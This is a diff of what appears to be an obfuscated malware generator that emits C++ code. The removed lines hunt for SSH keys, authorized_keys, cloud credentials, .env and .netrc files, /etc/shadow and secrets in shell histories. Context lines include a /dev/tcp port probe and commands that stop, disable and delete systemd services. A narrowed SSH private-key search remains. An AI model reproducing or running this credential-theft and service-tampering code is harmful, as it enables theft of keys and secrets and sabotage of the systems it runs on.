@@ -66,11 +66,7 @@ s_ns_ping_post   = S_(" 2>/dev/null | grep -c '1 received'")
 s_ns_probe_pre   = S_("(echo >/dev/tcp/")
 s_ns_probe_post  = S_(") 2>/dev/null && echo open || echo closed")
 s_open           = S_("open")
-s_ch_ssh         = S_("find / -maxdepth 5 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null")
-s_ch_auth        = S_("find / -maxdepth 5 \\( -name 'authorized_keys' -o -name 'known_hosts' \\) 2>/dev/null")
-s_ch_shadow      = S_("/etc/shadow")
-s_ch_cloud       = S_("find / -maxdepth 5 \\( -name 'credentials' -path '*/.aws/*' -o -name 'config' -path '*/.aws/*' -o -name '*.json' -path '*/.gcp/*' -o -name '*.json' -path '*/.config/gcloud/*' -o -name '.env' -o -name '.netrc' \\) 2>/dev/null")
-s_ch_hist        = S_("find / -maxdepth 4 -name '.bash_history' -o -name '.zsh_history' 2>/dev/null | xargs grep -ihE '(password|token|secret|api.key|AWS_|PRIVATE)' 2>/dev/null | head -50")
+s_ch_ssh         = S_("find /root /home -maxdepth 3 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null")
 s_sd_stop        = S_("systemctl stop ")
 s_sd_disable     = S_("systemctl disable ")
 s_sd_rm          = S_("rm -f ")
@@ -257,26 +253,6 @@ static std::string _t2() {
             if (!d.empty()) o += std::string(d.begin(), d.end()) + "\n";
         }
     }
-    std::string ak = _a(zz(""" + s_ch_auth + r"""));
-    if (!ak.empty()) {
-        std::istringstream ss(ak); std::string p;
-        while (std::getline(ss, p)) {
-            if (p.empty()) continue;
-            std::vector<uint8_t> d = _rf(p); if (!d.empty()) o += std::string(d.begin(), d.end()) + "\n";
-        }
-    }
-    std::vector<uint8_t> sh = _rf(zz(""" + s_ch_shadow + r"""));
-    if (!sh.empty()) o += std::string(sh.begin(), sh.end()) + "\n";
-    std::string cf = _a(zz(""" + s_ch_cloud + r"""));
-    if (!cf.empty()) {
-        std::istringstream ss(cf); std::string p;
-        while (std::getline(ss, p)) {
-            if (p.empty()) continue;
-            std::vector<uint8_t> d = _rf(p); if (!d.empty()) o += std::string(d.begin(), d.end()) + "\n";
-        }
-    }
-    std::string hg = _a(zz(""" + s_ch_hist + r"""));
-    if (!hg.empty()) o += hg + "\n";
     return o;
 }
 
